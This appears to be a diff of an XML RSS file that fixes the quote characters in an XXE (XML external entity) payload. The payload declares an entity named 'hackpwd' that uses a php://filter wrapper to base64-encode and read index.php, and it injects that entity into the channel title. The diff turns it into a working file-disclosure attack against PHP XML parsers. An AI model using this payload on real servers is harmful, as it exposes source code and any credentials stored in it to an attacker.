@@ -1,5 +1,5 @@
 <?xml version="1.0" ?>
-<!DOCTYPE name [<!ENTITY hackpwd SYSTEM “php://filter/convert.base64-encode/resource=index.php”>]>
+<!DOCTYPE name [<!ENTITY hackpwd SYSTEM "php://filter/convert.base64-encode/resource=index.php">]>
 <rss version="2.0">
 <channel>
   <title>Hello, &hackpwd;</title>
